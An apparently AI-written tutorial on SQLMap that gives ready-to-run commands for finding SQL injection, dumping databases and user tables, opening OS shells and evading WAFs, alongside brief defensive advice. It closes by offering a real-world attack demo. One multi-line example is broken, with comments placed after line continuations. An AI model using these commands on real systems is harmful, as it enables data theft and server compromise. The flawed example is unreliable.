### **SQLMap: The Ultimate SQL Injection Tool**

**SQLMap** is an open-source penetration testing tool designed to automate the detection and exploitation of SQL injection vulnerabilities in web applications. It supports a wide range of database management systems (DBMS) and injection techniques, making it a go-to tool for security professionals and ethical hackers.

---

## **Key Features of SQLMap**

1. **Automated SQL Injection Detection**

   - Tests parameters (GET/POST) for vulnerabilities.
   - Supports **Boolean-based**, **Time-based**, **Union-based**, and **Error-based** SQLi.

2. **Database Fingerprinting**

   - Identifies the backend DBMS (e.g., MySQL, PostgreSQL, MSSQL, Oracle).

3. **Data Extraction**

   - Dumps tables, columns, and records (e.g., usernames, passwords).
   - Supports **blind SQLi** (where results aren’t directly visible).

4. **Advanced Exploitation**

   - Bypasses WAFs (Web Application Firewalls) with tamper scripts.
   - Performs **OS command execution** (e.g., `--os-shell`).
   - Exfiltrates data via **DNS/HTTP requests** (out-of-band).

5. **Integration & Automation**

   - Works with **Burp Suite**, **ZAP**, and other proxies.
   - Supports **Google dorking** (`-g` option).

---

## **How SQLMap Works**

### **1. Basic Usage**

```bash
sqlmap -u "http://example.com/page?id=1" --batch
```

- `-u`: Target URL with a vulnerable parameter (`id=1`).
- `--batch`: Runs in non-interactive mode (skips prompts).

### **2. Database Enumeration**

#### **List All Databases**

```bash
sqlmap -u "http://example.com/page?id=1" --dbs
```

#### **Dump Tables from a Database**

```bash
sqlmap -u "http://example.com/page?id=1" -D database_name --tables
```

#### **Dump Data from a Table**

```bash
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --dump
```

### **3. Advanced Exploitation**

#### **Get an Interactive SQL Shell**

```bash
sqlmap -u "http://example.com/page?id=1" --sql-shell
```

#### **Execute OS Commands (if DB permits)**

```bash
sqlmap -u "http://example.com/page?id=1" --os-shell
```

#### **Bypass WAFs with Tamper Scripts**

```bash
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment
```

---

## **SQLMap Attack Techniques**

| **Flag**             | **Purpose**                                | **Example**                                       |
| -------------------- | ------------------------------------------ | ------------------------------------------------- |
| `--dbs`              | List all databases                         | `sqlmap -u "http://example.com?id=1" --dbs`       |
| `--tables`           | List tables in a database                  | `sqlmap -u "..." -D dbname --tables`              |
| `--columns`          | List columns in a table                    | `sqlmap -u "..." -D dbname -T users --columns`    |
| `--dump`             | Dump table data                            | `sqlmap -u "..." -D dbname -T users --dump`       |
| `--os-shell`         | Spawn an OS shell (if DB allows)           | `sqlmap -u "..." --os-shell`                      |
| `--level` / `--risk` | Adjust test intensity (1-5)                | `sqlmap -u "..." --level=3 --risk=3`              |
| `--tamper`           | Evade WAFs (e.g.,`space2comment`)          | `sqlmap -u "..." --tamper=space2comment`          |
| `--proxy`            | Route traffic through a proxy (e.g., Burp) | `sqlmap -u "..." --proxy="http://127.0.0.1:8080"` |

---

## **Defensive Measures Against SQLMap**

1. **Use Prepared Statements**
   ```python
   cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
   ```
2. **Deploy a WAF** (e.g., ModSecurity, Cloudflare).
3. **Limit Error Messages** (avoid exposing DB details).
4. **Restrict DB Permissions** (least privilege principle).
5. **Rate-Limit Requests** to slow down automated attacks.

---

## **Example: Full SQLMap Attack**

```bash
sqlmap -u "http://example.com/login.php?user=admin&pass=123" \
       --technique=B \          # Boolean-based blind
       --dbms=mysql \           # Target DBMS
       --dbs \                  # List databases
       --batch \                # Non-interactive
       --tamper=space2comment   # Evade WAF
```

---

### **Conclusion**

SQLMap is a powerful tool for detecting and exploiting SQL injection flaws. However, it should **only be used ethically** (e.g., penetration testing with permission).

Would you like a step-by-step demo of a real-world attack scenario?
